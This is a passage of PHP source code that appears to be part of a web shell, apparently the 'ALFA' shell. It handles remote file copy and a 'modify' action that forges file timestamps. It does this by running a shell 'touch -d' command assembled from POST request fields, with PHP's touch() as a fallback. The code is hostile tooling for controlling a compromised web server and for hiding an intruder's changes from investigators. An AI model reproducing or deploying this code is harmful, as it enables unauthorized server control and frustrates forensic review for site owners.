			echo("done");
		}elseif(is_dir($_POST["alfa1"])){
			if(!is_dir($_POST["alfa2"])){
				mkdir($_POST["alfa2"], 0755, true);
			}
			copy_paste($dir, $name , $_POST["alfa2"] . "/");
			echo("done");
		}
	}elseif($action == "modify"){
		if( !empty($_POST['alfa1']) ) {
			$time = strtotime($_POST['alfa1']);
			if($time){
				$touched = false;
				if($chdir_fals&&$alfa_canruncmd){
					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
					$touched = true;
				}
				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
					echo 'no';
				}else{
